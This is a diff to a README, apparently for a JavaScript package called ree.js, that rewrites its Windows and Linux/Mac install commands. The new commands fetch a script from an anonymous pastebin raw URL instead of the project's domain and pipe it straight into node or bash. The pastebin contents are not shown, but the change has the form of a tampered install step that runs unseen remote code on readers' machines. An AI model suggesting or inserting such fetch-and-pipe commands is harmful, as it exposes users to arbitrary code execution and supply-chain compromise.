@@ -12,12 +12,12 @@ Check up the discussions over our [Discord Server](https://discord.gg/eWbt297SkU
 > Install with:
 Windows 10/11:
 ```powershell
-Invoke-RestMethod https://ree.js.org/download | node
+Invoke-RestMethod https://pastebin.com/raw/PdLBGtkb | node
 ```
 
 Linux/Mac:
 ```bash
-curl -s https://ree.js.org/download | bash
+curl -s https://pastebin.com/raw/PdLBGtkb | bash
 ```
 
 Isn't this awesome? Its definitely better than npm install!
